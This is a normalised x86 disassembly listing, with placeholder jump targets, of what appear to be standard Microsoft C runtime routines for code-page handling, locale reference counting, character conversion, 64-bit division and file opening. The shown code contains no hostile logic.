mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0xac ]
cmp ecx 0x1
jle r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
movzx cx [ esi ]
mov [ eax ] cx
jmp r-xdata
mov ecx [ ebp + 0x10 ]
cmp ecx [ eax + 0xac ]
jb r-xdata
cmp [ ebp + 0x10 ] ecx
jl r-xdata
xor eax eax
inc eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
call sub_405ca6
mov [ eax ] 0x2a
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp [ esi + 0x1 ] bl
je r-xdata
xor edx edx
cmp [ ebp + 0x8 ] ebx
setne dl
push edx
push [ ebp + 0x8 ]
push ecx
push esi
push 0x9
push [ eax + 0x4 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
mov eax [ ebp - 0x10 ]
jne r-xdata
pop esi
pop ebx
leave
retn
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
mov eax [ eax + 0xac ]
cmp [ ebp - 0x4 ] bl
je r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
sub_40b890
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_407138
movzx eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x10 ]
mov ecx [ ecx + 0xc8 ]
movzx eax [ ecx + eax * 2 ]
and eax 0x8000
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_40b8e0
push ecx
lea ecx [ esp + 0x4 ]
sub ecx eax
sbb eax eax
not eax
and ecx eax
mov eax esp
and eax 0xfffff000
sub eax 0x1000
test [ eax ] eax
jmp r-xdata
mov eax ecx
pop ecx
xchg esp eax
mov eax [ eax ]
mov [ esp ] eax
retn
cmp ecx eax
jb r-xdata
sub_40b91a
push 0x10
push r--data
call sub_405254
and [ ebp - 0x4 ] 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ InitializeCriticalSectionAndSpinCount@IAT ]
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x1c ]
call sub_405299
retn
sub_40b97a
sub eax 0x3a4
je r-xdata
mov eax 0x411
retn
sub eax 0x4
je r-xdata
mov eax 0x804
retn
sub eax 0xd
je r-xdata
mov eax 0x412
retn
dec eax
je r-xdata
mov eax 0x404
retn
xor eax eax
retn
sub_40b9a9
mov edi edi
push esi
push edi
mov esi eax
push 0x101
xor edi edi
lea eax [ esi + 0x1c ]
push edi
push eax
call sub_4046e0
xor eax eax
movzx ecx ax
mov eax ecx
mov [ esi + 0x4 ] edi
mov [ esi + 0x8 ] edi
mov [ esi + 0xc ] edi
shl ecx 0x10
or eax ecx
lea edi [ esi + 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
mov ecx rw-data
add esp 0xc
lea eax [ esi + 0x1c ]
sub ecx esi
mov edi 0x101
mov dl [ ecx + eax ]
mov [ eax ] dl
inc eax
dec edi
jne r-xdata
lea eax [ esi + 0x11d ]
mov esi 0x100
mov dl [ eax + ecx ]
mov [ eax ] dl
inc eax
dec esi
jne r-xdata
pop edi
pop esi
retn
sub_40ba0d
mov edi edi
push ebp
mov ebp esp
sub esp 0x51c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push edi
lea eax [ ebp - 0x518 ]
push eax
push [ esi + 0x4 ]
call [ GetCPInfo@IAT ]
mov edi 0x100
test eax eax
je r-xdata
lea eax [ esi + 0x11d ]
mov [ ebp - 0x51c ] 0xffffff9f
xor ecx ecx
sub [ ebp - 0x51c ] eax
xor eax eax
cmp edx 0x19
ja r-xdata
or [ esi + ecx + 0x1d ] 0x10
mov dl cl
add dl 0x20
jmp r-xdata
mov [ ebp + eax - 0x104 ] al
inc eax
cmp eax edi
jb r-xdata
mov al [ ebp - 0x512 ]
mov [ ebp - 0x104 ] 0x20
test al al
je r-xdata
mov [ eax ] 0x0
or [ esi + ecx + 0x1d ] 0x20
mov dl cl
sub dl 0x20
mov [ eax ] dl
jmp r-xdata
push 0x0
push [ esi + 0xc ]
lea eax [ ebp - 0x504 ]
push [ esi + 0x4 ]
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push 0x1
push 0x0
call sub_40e52b
xor ebx ebx
push ebx
push [ esi + 0x4 ]
lea eax [ ebp - 0x204 ]
push edi
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push edi
push [ esi + 0xc ]
push ebx
call sub_40e32c
add esp 0x44
push ebx
push [ esi + 0x4 ]
lea eax [ ebp - 0x304 ]
push edi
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push 0x200
push [ esi + 0xc ]
push ebx
call sub_40e32c
add esp 0x24
xor eax eax
lea ebx [ ebp - 0x511 ]
mov edx [ ebp - 0x51c ]
lea eax [ esi + ecx + 0x11d ]
add edx eax
lea ebx [ edx + 0x20 ]
cmp ebx 0x19
ja r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_4045c5
leave
retn
inc ecx
cmp ecx edi
jb r-xdata
test cl 0x2
je r-xdata
or [ esi + eax + 0x1d ] 0x10
mov cl [ ebp + eax - 0x204 ]
jmp r-xdata
inc ebx
mov al [ ebx ]
inc ebx
test al al
jne r-xdata
sub eax ecx
inc eax
push eax
lea edx [ ebp + ecx - 0x104 ]
push 0x20
push edx
call sub_4046e0
add esp 0xc
mov [ esi + eax + 0x11d ] 0x0
or [ esi + eax + 0x1d ] 0x20
mov cl [ ebp + eax - 0x304 ]
mov [ esi + eax + 0x11d ] cl
jmp r-xdata
movzx ecx al
movzx eax [ ebx ]
cmp ecx eax
ja r-xdata
movzx ecx [ ebp + eax * 2 - 0x504 ]
test cl 0x1
je r-xdata
jmp r-xdata
inc eax
cmp eax edi
jb r-xdata
sub_40bba0
push 0xc
push r--data
call sub_405254
call sub_40a714
mov edi eax
mov eax [ rw-data ]
test [ edi + 0x70 ] eax
je r-xdata
push 0xd
call sub_40917b
pop ecx
and [ ebp - 0x4 ] 0x0
mov esi [ edi + 0x68 ]
mov [ ebp - 0x1c ] esi
cmp esi [ rw-data ]
je r-xdata
cmp [ edi + 0x6c ] 0x0
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40bc3b
jmp r-xdata
test esi esi
je r-xdata
mov esi [ edi + 0x68 ]
test esi esi
jne r-xdata
mov eax [ rw-data ]
mov [ edi + 0x68 ] eax
mov esi [ rw-data ]
mov [ ebp - 0x1c ] esi
push esi
call [ InterlockedIncrement@IAT ]
push esi
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov eax esi
call sub_405299
retn
push 0x20
call sub_409cd9
pop ecx
cmp esi rw-data
je r-xdata
push esi
call sub_404db5
pop ecx
sub_40bc44
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
xor ebx ebx
push ebx
lea ecx [ ebp - 0x10 ]
call sub_407138
mov [ rw-data ] ebx
cmp esi 0xfffffffe
jne r-xdata
cmp esi 0xfffffffd
jne r-xdata
mov [ rw-data ] 0x1
call [ GetOEMCP@IAT ]
cmp esi 0xfffffffc
jne r-xdata
mov [ rw-data ] 0x1
call [ GetACP@IAT ]
jmp r-xdata
pop ebx
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x4 ]
mov [ rw-data ] 0x1
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax esi
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
sub_40bcc0
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
push edi
call sub_40bc44
mov edi eax
xor esi esi
mov [ ebp + 0x8 ] edi
cmp edi esi
jne r-xdata
mov [ ebp - 0x1c ] esi
xor eax eax
mov eax ebx
call sub_40b9a9
push 0x101
lea eax [ ebx + 0x1c ]
push esi
push eax
call sub_4046e0
mov ecx [ ebp - 0x1c ]
add esp 0xc
imul ecx ecx 0x30
mov [ ebp - 0x20 ] esi
lea esi [ ecx + rw-data ]
mov [ ebp - 0x1c ] esi
jmp r-xdata
inc [ ebp - 0x1c ]
add eax 0x30
cmp eax 0xf0
jb r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_4045c5
leave
retn
cmp [ esi ] 0x0
jne r-xdata
cmp [ eax + rw-data ] edi
je r-xdata
cmp edi 0xfde8
je r-xdata
mov al [ esi + 0x1 ]
test al al
je r-xdata
mov esi [ ebp - 0x1c ]
inc [ ebp - 0x20 ]
add esi 0x8
cmp [ ebp - 0x20 ] 0x4
mov [ ebp - 0x1c ] esi
jb r-xdata
or eax 0xffffffff
cmp edi 0xfde9
je r-xdata
movzx edi [ esi ]
movzx eax al
jmp r-xdata
mov eax edi
mov [ ebx + 0x4 ] edi
mov [ ebx + 0x8 ] 0x1
call sub_40b97a
push 0x6
mov [ ebx + 0xc ] eax
lea eax [ ebx + 0x10 ]
lea ecx [ ecx + rw-data ]
pop edx
movzx eax di
push eax
call [ IsValidCodePage@IAT ]
test eax eax
je r-xdata
cmp edi eax
jbe r-xdata
mov si [ ecx ]
inc ecx
mov [ eax ] si
inc ecx
inc eax
inc eax
dec edx
jne r-xdata
mov esi ebx
call sub_40ba0d
jmp r-xdata
lea eax [ ebp - 0x18 ]
push eax
push edi
call [ GetCPInfo@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x20 ]
mov al [ eax + rw-data ]
or [ ebx + edi + 0x1d ] al
movzx eax [ esi + 0x1 ]
inc edi
mov edi [ ebp + 0x8 ]
inc esi
inc esi
xor eax eax
jmp r-xdata
cmp [ rw-data ] esi
jne r-xdata
push 0x101
lea eax [ ebx + 0x1c ]
push esi
push eax
call sub_4046e0
xor edx edx
inc edx
add esp 0xc
mov [ ebx + 0x4 ] edi
mov [ ebx + 0xc ] esi
cmp [ ebp - 0x18 ] edx
jbe r-xdata
mov [ ebx + 0x8 ] esi
cmp [ ebp - 0x12 ] 0x0
je r-xdata
lea eax [ ebx + 0x1e ]
mov ecx 0xfe
lea esi [ ebp - 0x11 ]
or [ eax ] 0x8
inc eax
dec ecx
jne r-xdata
mov eax [ ebx + 0x4 ]
call sub_40b97a
mov [ ebx + 0xc ] eax
mov [ ebx + 0x8 ] edx
jmp r-xdata
movzx eax [ esi - 0x1 ]
movzx ecx cl
jmp r-xdata
xor eax eax
movzx ecx ax
mov eax ecx
shl ecx 0x10
or eax ecx
lea edi [ ebx + 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
jmp r-xdata
cmp eax ecx
jbe r-xdata
or [ ebx + eax + 0x1d ] 0x4
inc eax
inc esi
inc esi
cmp [ esi - 0x1 ] 0x0
jne r-xdata
mov cl [ esi ]
test cl cl
je r-xdata
sub_40bea5
push 0x14
push r--data
call sub_405254
or [ ebp - 0x20 ] 0xffffffff
call sub_40a714
mov edi eax
mov [ ebp - 0x24 ] edi
call sub_40bba0
mov ebx [ edi + 0x68 ]
mov esi [ ebp + 0x8 ]
call sub_40bc44
mov [ ebp + 0x8 ] eax
cmp eax [ ebx + 0x4 ]
je r-xdata
and [ ebp - 0x20 ] 0x0
push 0x220
call sub_40a9ea
pop ecx
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x20 ]
call sub_405299
retn
mov ecx 0x88
mov esi [ edi + 0x68 ]
mov edi ebx
[ edi ] [ esi ]
and [ ebx ] 0x0
push ebx
push [ ebp + 0x8 ]
call sub_40bcc0
pop ecx
pop ecx
mov [ ebp - 0x20 ] eax
test eax eax
jne r-xdata
cmp eax 0xffffffff
jne r-xdata
mov esi [ ebp - 0x24 ]
push [ esi + 0x68 ]
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
cmp ebx rw-data
je r-xdata
mov [ esi + 0x68 ] ebx
push ebx
mov edi [ InterlockedIncrement@IAT ]
call edi
test [ esi + 0x70 ] 0x2
jne r-xdata
mov eax [ esi + 0x68 ]
cmp eax rw-data
je r-xdata
call sub_405ca6
mov [ eax ] 0x16
jmp r-xdata
push ebx
call sub_404db5
pop ecx
test [ rw-data ] 0x1
jne r-xdata
push eax
call sub_404db5
pop ecx
push 0xd
call sub_40917b
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ ebx + 0x4 ]
mov [ rw-data ] eax
mov eax [ ebx + 0x8 ]
mov [ rw-data ] eax
mov eax [ ebx + 0xc ]
mov [ rw-data ] eax
xor eax eax
xor eax eax
mov cx [ ebx + eax * 2 + 0x10 ]
mov [ eax * 2 + rw-data ] cx
inc eax
jmp r-xdata
xor eax eax
mov cl [ eax + ebx + 0x1c ]
mov [ eax + rw-data ] cl
inc eax
jmp r-xdata
mov [ ebp - 0x1c ] eax
cmp eax 0x5
jge r-xdata
push [ rw-data ]
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov cl [ eax + ebx + 0x11d ]
mov [ eax + rw-data ] cl
inc eax
jmp r-xdata
mov [ ebp - 0x1c ] eax
cmp eax 0x101
jge r-xdata
mov [ rw-data ] ebx
push ebx
call edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40c006
jmp r-xdata
mov eax [ rw-data ]
cmp eax rw-data
je r-xdata
mov [ ebp - 0x1c ] eax
cmp eax 0x100
jge r-xdata
push eax
call sub_404db5
pop ecx
sub_40c05d
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xbc ]
xor ebx ebx
push edi
cmp eax ebx
je r-xdata
mov eax [ esi + 0xc0 ]
cmp eax ebx
je r-xdata
cmp eax rw-data
je r-xdata
lea edi [ esi + 0xd4 ]
mov eax [ edi ]
cmp eax rw-data
je r-xdata
cmp [ eax ] ebx
jne r-xdata
mov eax [ esi + 0xb0 ]
cmp eax ebx
je r-xdata
lea edi [ esi + 0x50 ]
mov [ ebp + 0x8 ] 0x6
cmp [ eax + 0xb4 ] ebx
jne r-xdata
mov eax [ esi + 0xc4 ]
sub eax 0xfe
push eax
call sub_404db5
mov eax [ esi + 0xcc ]
mov edi 0x80
sub eax edi
push eax
call sub_404db5
mov eax [ esi + 0xd0 ]
sub eax edi
push eax
call sub_404db5
push [ esi + 0xc0 ]
call sub_404db5
add esp 0x10
cmp [ eax ] ebx
jne r-xdata
cmp [ edi - 0x4 ] ebx
je r-xdata
mov eax [ edi ]
cmp eax ebx
je r-xdata
push eax
call sub_40e56d
push [ edi ]
call sub_404db5
pop ecx
pop ecx
mov eax [ esi + 0xb8 ]
cmp eax ebx
je r-xdata
add edi 0x10
dec [ ebp + 0x8 ]
jne r-xdata
mov eax [ edi + 0x4 ]
cmp eax ebx
je r-xdata
cmp [ eax ] ebx
jne r-xdata
mov eax [ esi + 0xb4 ]
cmp eax ebx
je r-xdata
cmp [ eax ] ebx
jne r-xdata
cmp [ edi - 0x8 ] rw-data
je r-xdata
push esi
call sub_404db5
pop ecx
pop edi
pop esi
pop ebx
pop ebp
retn
cmp [ eax ] ebx
jne r-xdata
push eax
call sub_404db5
pop ecx
push [ esi + 0xb0 ]
call sub_404db5
push [ esi + 0xbc ]
call sub_404db5
pop ecx
pop ecx
cmp [ eax ] ebx
jne r-xdata
push eax
call sub_404db5
push [ esi + 0xbc ]
call sub_40e747
pop ecx
pop ecx
push eax
call sub_404db5
pop ecx
push eax
call sub_404db5
push [ esi + 0xbc ]
call sub_40e702
pop ecx
pop ecx
sub_40c1a6
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ InterlockedIncrement@IAT ]
push edi
mov edi [ ebp + 0x8 ]
push edi
call esi
mov eax [ edi + 0xb0 ]
test eax eax
je r-xdata
mov eax [ edi + 0xb8 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xb4 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xc0 ]
test eax eax
je r-xdata
push eax
call esi
lea ebx [ edi + 0x50 ]
mov [ ebp + 0x8 ] 0x6
push eax
call esi
cmp [ ebx - 0x4 ] 0x0
je r-xdata
mov eax [ ebx ]
test eax eax
je r-xdata
add ebx 0x10
dec [ ebp + 0x8 ]
jne r-xdata
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
push eax
call esi
cmp [ ebx - 0x8 ] rw-data
je r-xdata
mov eax [ edi + 0xd4 ]
add eax 0xb4
push eax
call esi
pop edi
pop esi
pop ebx
pop ebp
retn
push eax
call esi
sub_40c235
mov edi edi
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x8 ]
test edi edi
je r-xdata
mov eax edi
pop edi
pop ebp
retn
push ebx
push esi
mov esi [ InterlockedDecrement@IAT ]
push edi
call esi
mov eax [ edi + 0xb0 ]
test eax eax
je r-xdata
mov eax [ edi + 0xb8 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xb4 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xc0 ]
test eax eax
je r-xdata
push eax
call esi
lea ebx [ edi + 0x50 ]
mov [ ebp + 0x8 ] 0x6
push eax
call esi
cmp [ ebx - 0x4 ] 0x0
je r-xdata
mov eax [ ebx ]
test eax eax
je r-xdata
add ebx 0x10
dec [ ebp + 0x8 ]
jne r-xdata
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
push eax
call esi
cmp [ ebx - 0x8 ] rw-data
je r-xdata
mov eax [ edi + 0xd4 ]
add eax 0xb4
push eax
call esi
pop esi
pop ebx
push eax
call esi
sub_40c2ce
test edi edi
je r-xdata
xor eax eax
retn
test eax eax
je r-xdata
push esi
mov esi [ eax ]
cmp esi edi
je r-xdata
mov eax edi
pop esi
retn
push edi
mov [ eax ] edi
call sub_40c1a6
pop ecx
test esi esi
je r-xdata
push esi
call sub_40c235
cmp [ esi ] 0x0
pop ecx
jne r-xdata
cmp esi rw-data
je r-xdata
push esi
call sub_40c05d
pop ecx
sub_40c30c
push 0xc
push r--data
call sub_405254
call sub_40a714
mov esi eax
mov eax [ rw-data ]
test [ esi + 0x70 ] eax
je r-xdata
push 0xc
call sub_40917b
pop ecx
and [ ebp - 0x4 ] 0x0
lea eax [ esi + 0x6c ]
mov edi [ rw-data ]
call sub_40c2ce
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40c376
jmp r-xdata
cmp [ esi + 0x6c ] 0x0
je r-xdata
test esi esi
jne r-xdata
call sub_40a714
mov esi [ eax + 0x6c ]
mov eax esi
call sub_405299
retn
push 0x20
call sub_409cd9
pop ecx
sub_40c382
mov edi edi
push esi
push edi
xor edi edi
lea esi [ edi + rw-data ]
push [ esi ]
call sub_40a44d
add edi 0x4
pop ecx
mov [ esi ] eax
cmp edi 0x28
jb r-xdata
pop edi
pop esi
retn
sub_40c3a3
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi [ ebp + 0xc ]
xor ebx ebx
push edi
mov edi [ ebp + 0x10 ]
cmp esi ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
cmp edi ebx
jbe r-xdata
cmp edi 0x7fffffff
jbe r-xdata
or [ eax ] 0xffffffff
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
push [ ebp + 0x18 ]
lea ecx [ ebp - 0x10 ]
call sub_407138
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] ebx
jne r-xdata
call sub_405ca6
push 0x16
pop esi
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] esi
call sub_405c3e
add esp 0x14
xor eax eax
jmp r-xdata
mov [ eax ] ebx
lea ecx [ ebp + 0xc ]
push ecx
push ebx
push edi
push esi
push 0x1
lea ecx [ ebp + 0x14 ]
push ecx
push ebx
mov [ ebp + 0xc ] ebx
push [ eax + 0x4 ]
call [ WideCharToMultiByte@IAT ]
cmp eax ebx
je r-xdata
mov ax [ ebp + 0x14 ]
mov ecx 0xff
cmp ax cx
jbe r-xdata
pop edi
pop esi
pop ebx
leave
retn
call [ GetLastError@IAT ]
cmp eax 0x7a
jne r-xdata
cmp [ ebp + 0xc ] ebx
jne r-xdata
cmp esi ebx
je r-xdata
cmp esi ebx
je r-xdata
call sub_405ca6
mov [ eax ] 0x2a
call sub_405ca6
mov eax [ eax ]
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp esi ebx
je r-xdata
mov ecx [ ebp + 0x8 ]
cmp ecx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
cmp edi ebx
ja r-xdata
cmp edi ebx
jbe r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
call sub_405ca6
push 0x22
pop esi
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] esi
call sub_405c3e
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp edi ebx
jbe r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
mov [ ecx ] eax
jmp r-xdata
mov [ eax ] 0x1
mov [ esi ] al
push edi
push ebx
push esi
call sub_4046e0
add esp 0xc
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
jmp r-xdata
push edi
push ebx
push esi
call sub_4046e0
add esp 0xc
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
jmp r-xdata
sub_40c530
push esi
mov eax [ esp + 0x14 ]
or eax eax
jne r-xdata
mov ecx eax
mov ebx [ esp + 0x10 ]
mov edx [ esp + 0xc ]
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0x8 ]
div ecx
mov esi eax
mov eax ebx
mul [ esp + 0x10 ]
mov ecx eax
mov eax esi
mul [ esp + 0x10 ]
add edx ecx
jmp r-xdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne r-xdata
div ebx
mov esi eax
mul [ esp + 0x14 ]
mov ecx eax
mov eax [ esp + 0x10 ]
mul esi
add edx ecx
jb r-xdata
sub eax [ esp + 0x8 ]
sbb edx [ esp + 0xc ]
neg edx
neg eax
sbb edx 0x0
mov ecx edx
mov edx ebx
mov ebx ecx
mov ecx eax
mov eax esi
pop esi
retn 0x10
dec esi
sub eax [ esp + 0x10 ]
sbb edx [ esp + 0x14 ]
cmp edx [ esp + 0xc ]
ja r-xdata
jb r-xdata
xor ebx ebx
cmp eax [ esp + 0x8 ]
jbe r-xdata
sub_40c5c5
mov edi edi
push ebp
mov ebp esp
sub esp 0x30
push ebx
xor ebx ebx
test [ ebp + 0x10 ] 0x80
push esi
push edi
mov esi eax
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x2 ] bl
mov [ ebp - 0x30 ] 0xc
mov [ ebp - 0x2c ] ebx
je r-xdata
mov [ ebp - 0x28 ] 0x1
mov [ ebp - 0x1 ] bl
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x1 ] 0x10
jmp r-xdata
mov ecx [ ebp + 0x10 ]
mov eax 0x8000
test eax ecx
jne r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_405b16
add esp 0x14
lea eax [ ebp - 0x20 ]
push eax
call sub_40ee05
pop ecx
test eax eax
je r-xdata
mov eax ecx
and eax 0x3
sub eax ebx
mov edx 0xc0000000
mov edi 0x80000000
je r-xdata
test ecx 0x74000
jne r-xdata
mov [ ebp - 0x8 ] edi
dec eax
je r-xdata
or [ ebp - 0x1 ] 0x80
cmp [ ebp - 0x20 ] eax
je r-xdata
mov [ ebp - 0x10 ] ebx
sub eax ecx
je r-xdata
test cl 0x8
je r-xdata
dec eax
je r-xdata
cmp eax 0x500
je r-xdata
je r-xdata
mov [ ebp - 0x10 ] 0x1
jmp r-xdata
sub eax ecx
je r-xdata
mov [ ebp - 0x8 ] 0x40000000
jmp r-xdata
test ecx 0x70000
jne r-xdata
mov [ ebp - 0x8 ] edx
jmp r-xdata
call sub_405cb9
mov [ eax ] ebx
or [ esi ] 0xffffffff
call sub_405ca6
push 0x16
pop esi
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] esi
call sub_405c3e
add esp 0x14
jmp r-xdata
mov [ ebp - 0x14 ] 0x1
cmp eax 0x600
je r-xdata
mov [ ebp - 0x14 ] 0x3
jmp r-xdata
cmp eax ebx
je r-xdata
mov eax [ ebp + 0x10 ]
mov edx 0x700
and eax edx
mov ecx 0x400
cmp eax ecx
mov edi 0x100
jg r-xdata
mov [ ebp - 0x10 ] 0x2
jmp r-xdata
sub eax ecx
je r-xdata
mov eax [ ebp + 0x14 ]
push 0x10
pop ecx
sub eax ecx
je r-xdata
mov eax esi
jmp r-xdata
test al 0x40
je r-xdata
mov ecx [ rw-data ]
not ecx
and ecx [ ebp + 0x18 ]
test cl cl
js r-xdata
mov [ ebp - 0x14 ] 0x5
jmp r-xdata
cmp eax edx
jne r-xdata
mov eax [ ebp + 0x10 ]
mov [ ebp - 0xc ] 0x80
test edi eax
je r-xdata
cmp eax edi
je r-xdata
mov [ ebp - 0x10 ] 0x3
jmp r-xdata
sub eax 0x40
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
test eax 0x1000
je r-xdata
or [ ebp - 0xc ] 0x4000000
or [ ebp - 0x8 ] 0x10000
or [ ebp - 0x10 ] 0x4
mov [ ebp - 0xc ] 0x1
mov [ ebp - 0x14 ] 0x4
jmp r-xdata
cmp eax 0x200
je r-xdata
cmp [ ebp - 0x8 ] edi
sete al
mov [ ebp - 0x10 ] eax
jmp r-xdata
test al 0x20
je r-xdata
or [ ebp - 0xc ] edi
cmp eax 0x300
jne r-xdata
test al 0x10
je r-xdata
or [ ebp - 0xc ] 0x8000000
jmp r-xdata
mov [ ebp - 0x14 ] 0x2
jmp r-xdata
call sub_406a5c
mov [ esi ] eax
cmp eax 0xffffffff
jne r-xdata
or [ ebp - 0xc ] 0x10000000
mov eax [ ebp + 0x8 ]
mov edi [ CreateFileA@IAT ]
push ebx
push [ ebp - 0xc ]
mov [ eax ] 0x1
push [ ebp - 0x14 ]
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x10 ]
push [ ebp - 0x8 ]
push [ ebp + 0xc ]
call edi
mov [ ebp - 0x1c ] eax
cmp eax 0xffffffff
jne r-xdata
call sub_405cb9
mov [ eax ] ebx
or [ esi ] 0xffffffff
call sub_405ca6
mov [ eax ] 0x18
jmp r-xdata
push [ ebp - 0x1c ]
call [ GetFileType@IAT ]
cmp eax ebx
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov eax 0xc0000000
and ecx eax
cmp ecx eax
jne r-xdata
call sub_405ca6
mov eax [ eax ]
jmp r-xdata
cmp eax 0x2
jne r-xdata
mov esi [ esi ]
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
lea eax [ eax + esi + 0x4 ]
and [ eax ] 0xfe
call [ GetLastError@IAT ]
mov esi eax
push esi
call sub_405ccc
pop ecx
push [ ebp - 0x1c ]
call [ CloseHandle@IAT ]
cmp esi ebx
jne r-xdata
mov esi [ esi ]
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
lea eax [ eax + esi + 0x4 ]
and [ eax ] 0xfe
call [ GetLastError@IAT ]
push eax
call sub_405ccc
test [ ebp + 0x10 ] 0x1
je r-xdata
cmp eax 0x3
jne r-xdata
or [ ebp - 0x1 ] 0x40
jmp r-xdata
call sub_405ca6
mov [ eax ] 0xd
jmp r-xdata
and [ ebp - 0x8 ] 0x7fffffff
push ebx
push [ ebp - 0xc ]
lea eax [ ebp - 0x30 ]
push [ ebp - 0x14 ]
push eax
push [ ebp - 0x10 ]
push [ ebp - 0x8 ]
push [ ebp + 0xc ]
call edi
mov [ ebp - 0x1c ] eax
cmp eax 0xffffffff
jne r-xdata
push [ ebp - 0x1c ]
push [ esi ]
call sub_406817
mov eax [ esi ]
mov edx eax
and eax 0x1f
sar edx 0x5
mov edx [ edx * 4 + rw-data ]
pop ecx
shl eax 0x6
pop ecx
mov cl [ ebp - 0x1 ]
or cl 0x1
mov [ edx + eax + 0x4 ] cl
mov eax [ esi ]
mov edx eax
and eax 0x1f
sar edx 0x5
mov edx [ edx * 4 + rw-data ]
shl eax 0x6
lea eax [ edx + eax + 0x24 ]
and [ eax ] 0x80
mov [ ebp - 0x3 ] cl
and [ ebp - 0x3 ] 0x48
mov [ ebp - 0x1 ] cl
jne r-xdata
or [ ebp - 0x1 ] 0x8
test [ ebp - 0x1 ] 0x80
je r-xdata
test cl 0x80
je r-xdata
mov eax [ esi ]
mov ecx eax
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
and eax 0x1f
shl eax 0x6
lea eax [ ecx + eax + 0x24 ]
mov cl [ eax ]
xor cl [ ebp - 0x2 ]
and cl 0x7f
xor [ eax ] cl
mov eax [ esi ]
mov ecx eax
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
and eax 0x1f
shl eax 0x6
